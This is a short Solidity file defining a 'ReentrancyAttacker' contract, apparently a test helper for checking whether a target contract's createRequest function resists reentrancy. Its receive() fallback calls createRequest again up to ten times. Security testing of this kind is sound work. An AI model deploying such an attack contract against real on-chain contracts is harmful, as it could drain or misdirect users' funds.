// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVulnerable {
    function createRequest(address[] calldata receivers, uint256[] calldata amounts, string calldata description) external returns (uint256);
}

contract ReentrancyAttacker {
    IVulnerable public target;
    uint256 public attackCount;
    
    constructor(address _target) {
        target = IVulnerable(_target);
    }
    
    function attack() external {
        // Attempt reentrancy attack
        address[] memory receivers = new address[](1);
        receivers[0] = address(this);
        
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1000;
        
        target.createRequest(receivers, amounts, "Attack");
    }
    
    // Fallback to attempt reentrancy
    receive() external payable {
        if (attackCount < 10) {
            attackCount++;
            
            address[] memory receivers = new address[](1);
            receivers[0] = address(this);
            
            uint256[] memory amounts = new uint256[](1);
            amounts[0] = 1000;
            
            try target.createRequest(receivers, amounts, "Reentrant") {
                // Continue attack
            } catch {
                // Attack failed
            }
        }
    }
}